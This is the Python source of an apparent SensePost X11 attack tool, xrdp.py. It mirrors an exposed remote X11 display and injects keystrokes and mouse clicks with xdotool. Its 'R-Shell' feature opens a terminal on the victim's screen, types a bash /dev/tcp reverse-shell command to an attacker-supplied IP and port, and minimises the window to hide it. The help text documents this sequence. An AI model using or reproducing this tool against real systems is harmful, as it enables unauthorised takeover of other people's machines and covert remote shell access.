#!/usr/bin/python3
#
# xrdp.py - X11 Remote Desktop
# =====================================
#
# Authors:
# darryn@sensepost.com
# thomas@sensepost.com
#

import os
import sys
import subprocess
import time
import re
import socket

try:
    import PySimpleGUI as sg
except ImportError:
    print("Error: PySimpleGUI no está instalado.")
    print("Instálalo con: pip install PySimpleGUI")
    sys.exit(1)

class xwin:
	host = ''
	xww = True
	keyspace = {' ':'space', '!':'exclam', '"':'quotedbl', '#':'numbersign', '$':'dollar', '%':'percent', '&':'ampersand', '\'':'quoteright', '(':'parenleft', ')':'parenright', '[':'bracketleft', '*':'asterisk', '+':'plus', ',':'comma', '-':'minus', '.':'period', '/':'slash', ':':'colon', ';':'semicolon', '<':'less', '=':'equal', '>':'greater', '?':'question', '@':'at', '\\':'backslash', ']':'bracketright', '^':'asciicircum', '_':'underscore', '`':'grave', '{':'braceleft', '|':'bar', '}':'braceright', '~':'asciitilde'}
	spr_state = False
	ctrl_state = False
	alt_state = False

	def on_click(self, x, y, button):
		cmd = 'export DISPLAY={} && xdotool mousemove {} {}'.format(self.host, x, y)
		if button == 1:
			cmd += ' click 1'
		elif button == 3:
			cmd += ' click 3'
		os.system(cmd)

	def string_to_xdo(self, st, window=None):
		if (len(st) == 0):
			return 'Return'
		st = list(st)
		out = ''
		for ch in st:
			if ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
				out += ch + ' '
			else:
				if ch in self.keyspace:
					out += self.keyspace[ch] + ' '
				else:
					out += ch + ' '

		if ((len(out) > 2) and (self.spr_state or self.ctrl_state or self.alt_state)):
			if window:
				sg.popup_error('SUPER or CTRL or ALT are toggled. Only one character please.')
			return ''
		elif (self.spr_state and self.ctrl_state and self.alt_state):
			out = 'super+ctrl+alt+' + out
		elif (self.spr_state and self.ctrl_state):
			out = 'super+ctrl+' + out
		elif (self.spr_state and self.alt_state):
			out = 'super+alt+' + out
		elif (self.ctrl_state and self.alt_state):
			out = 'ctrl+alt+' + out
		elif (self.spr_state):
			out = 'super+' + out
		elif (self.ctrl_state):
			out = 'ctrl+' + out
		elif (self.alt_state):
			out = 'alt+' + out

		self.spr_state = False
		self.ctrl_state = False
		self.alt_state = False

		return out

	def on_shell_clicked(self, entry_text):
		if (len(entry_text) == 0):
			sg.popup_error("IP:Port")
			return
		if ' ' in entry_text:
			dest = entry_text.split(' ')
		else:
			dest = entry_text.split(':')
		cmd = 'export DISPLAY={} && xdotool key ctrl+alt+t'.format(self.host)
		os.system(cmd)
		time.sleep(3)
		cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(cmd))
		os.system(cmd)
		time.sleep(5)
		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
		os.system(cmd)
		cmd = 'export DISPLAY={} && xdotool key ctrl+super+Down'.format(self.host)
		os.system(cmd)

	def on_backspace_clicked(self):
		cmd = 'export DISPLAY={} && xdotool key BackSpace'.format(self.host)
		os.system(cmd)

	def on_enter_clicked(self):
		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
		os.system(cmd)

	def on_button_toggled(self, name):
		if name == 'spr':
			self.spr_state = not self.spr_state
		elif name == 'ctrl':
			self.ctrl_state = not self.ctrl_state
		elif name == 'alt':
			self.alt_state = not self.alt_state

	def enter_callback(self, entry_text):
		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(entry_text))
		os.system(cmd)

	def destroy(self):
		if self.xww:
			os.system("kill {}".format(self.xww.pid + 1))

	def __init__(self, width, height):
		sg.theme('DarkGray13')
		
		layout = [
			[sg.Canvas(size=(width, height), key='-CANVAS-')],
			[
				sg.Input(key='-INPUT-', size=(30, 1)),
				sg.Button('spr', key='-SPR-'),
				sg.Button('ctrl', key='-CTRL-'),
				sg.Button('alt', key='-ALT-'),
				sg.Button('Enter', key='-ENTER-'),
				sg.Button('Backspace', key='-BACKSPACE-'),
				sg.Button('R-Shell', key='-SHELL-'),
			]
		]

		self.window = sg.Window('X11 Remote Desktop', layout, size=(width, height + 80), location=(100, 100), finalize=True)
		
		canvas = self.window['-CANVAS-'].TKCanvas
		canvas.bind('<Button-1>', lambda e: self.on_click(e.x, e.y, 1))
		canvas.bind('<Button-3>', lambda e: self.on_click(e.x, e.y, 3))

	def main(self):
		spr_pressed = False
		ctrl_pressed = False
		alt_pressed = False

		while True:
			event, values = self.window.read(timeout=100)

			if event == sg.WINDOW_CLOSED:
				self.destroy()
				break
			
			if event == '-INPUT-':
				entry_text = values['-INPUT-']
				if entry_text:
					self.enter_callback(entry_text)
					self.window['-INPUT-'].update('')

			elif event == '-SPR-':
				self.on_button_toggled('spr')
				self.window['-SPR-'].update(button_color=('white', 'red' if self.spr_state else None))

			elif event == '-CTRL-':
				self.on_button_toggled('ctrl')
				self.window['-CTRL-'].update(button_color=('white', 'red' if self.ctrl_state else None))

			elif event == '-ALT-':
				self.on_button_toggled('alt')
				self.window['-ALT-'].update(button_color=('white', 'red' if self.alt_state else None))

			elif event == '-ENTER-':
				self.on_enter_clicked()

			elif event == '-BACKSPACE-':
				self.on_backspace_clicked()

			elif event == '-SHELL-':
				entry_text = values['-INPUT-']
				self.on_shell_clicked(entry_text)
				self.window['-INPUT-'].update('')

		self.window.close()

def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False

def main():
	print("""\
	              _       
	__  ___ __ __| |_ __  
	\ \/ / '__/ _` | '_ \ 
	 >  <| | | (_| | |_) |
	/_/\_\_|  \__,_| .__/ 
	               |_|    
		X11 Remote Desktop
	""")

	if (len(sys.argv) == 1):
		print("xrdp.py <host>:<dp>")
		print("------------------------")
		print("Example:")
		print("xrdp.py 10.0.0.10:0")
		print("xrdp.py 10.0.0.10:0 --no-disp")
		print("")
		quit()
	elif ((sys.argv[1] == "-h") or (sys.argv[1] == "--help")):
		print('''
xrdp.py - X11 Remote Desktop
=====================================

this is a rudimentary remote desktop tool for the X11 protocol

xrdp.py <host>:<dp>
--------------
 Example: xrdp.py 10.0.0.10:0
          xrdp.py 10.0.0.10:0 --no-disp

requirements:
--------------
 xwininfo
 xwatchwin
 xdotool
 PySimpleGUI (install with: pip install PySimpleGUI)

installation:
--------------
 pip install PySimpleGUI

usage:
--------------
 --no-disp  = only load the keyboard input fields (do not render display)
 spr 		= toggle on/off + type character in entry + press enter to send
 ctrl 		= toggle on/off + type character in entry + press enter to send
 alt 		= toggle on/off + type character in entry + press enter to send
 Enter 		= press button to send enter key
 Backspace 	= press button to send backspace key
 R-Shell 	= type ip:port in entry + press button = automatically open terminal and run reverse shell then minimize window (ctrl+alt+t -> bashmagic -> ctrl+super+down)

Authors:
darryn@sensepost.com
thomas@sensepost.com
''')
		quit()
	elif (sys.argv[1] == "--authors"):
		print('''
Written by
  ____                                      ___         _   _  
 (|   \                                    / (_)       | | | | 
  |    | __,   ,_    ,_          _  _     |            | | | | 
 _|    |/  |  /  |  /  |  |   | / |/ |    |     |   |  |/  |/  
(/\___/ \_/|_/   |_/   |_/ \_/|/  |  |_/   \___/ \_/|_/|__/|__/
                             /|                                
                             \|                                
            and
 ______ _                                  _                                 _                 
(_) |  | |                                (_|    |             |            | |                
    |  | |     __   _  _  _    __,   ,      |    |   _  _    __|   _   ,_   | |     __,        
  _ |  |/ \   /  \_/ |/ |/ |  /  |  / \_    |    |  / |/ |  /  |  |/  /  |  |/ \   /  |  |   | 
 (_/   |   |_/\__/   |  |  |_/\_/|_/ \/      \__/\_/  |  |_/\_/|_/|__/   |_/|   |_/\_/|_/ \_/|/
                                                                                            /| 
                                                                                            \| 
''')
		quit()

	disp = True

	try:
		inp1 = sys.argv[1]
		inp2 = sys.argv[2]

		if (inp1 == "--no-disp"):
			host = inp2
			disp = False
		elif (inp2 == "--no-disp"):
			host = inp1
			disp = False
	except IndexError:
		host = sys.argv[1]

	valid = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,2}$", host)
	if valid:
		if not valid_ip(host.split(':')[0]):
			print('Invalid IP address.')
			quit()
		if (int(host.split(':')[1]) > 63):
			print('Invalid diplay number.')
			quit()
	else:
		print('Invalid input.')
		quit()

	try:
		xwininfo = "xwininfo -root -display {}".format(host)
		dpinfo = subprocess.check_output(xwininfo, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
		
		winid = re.search('Window id: 0x[0-9a-fA-F]+', dpinfo)
		winid = winid.group(0).split(' ')
		winid = winid[2]

		winwidth = re.search('Width: [0-9]+', dpinfo)
		winwidth = winwidth.group(0).split(' ')
		winwidth = int(winwidth[1])

		winheight = re.search('Height: [0-9]+', dpinfo)
		winheight = winheight.group(0).split(' ')
		winheight = int(winheight[1])

		if disp:
			xwatchwin = "xwatchwin {} -w {} > /dev/null".format(host, winid)
			xww = subprocess.Popen(xwatchwin, shell=True)
			time.sleep(2)

			xwinmove = "xdotool getactivewindow windowmove 100 100"
			os.system(xwinmove)

			overlay = xwin(winwidth, winheight)
			overlay.host = host
			overlay.xww = xww
			overlay.main()
		else:
			overlay = xwin(480, 1)
			overlay.host = host
			overlay.xww = False
			overlay.main()
	except KeyboardInterrupt:
		quit()


if __name__ == '__main__':
	main()
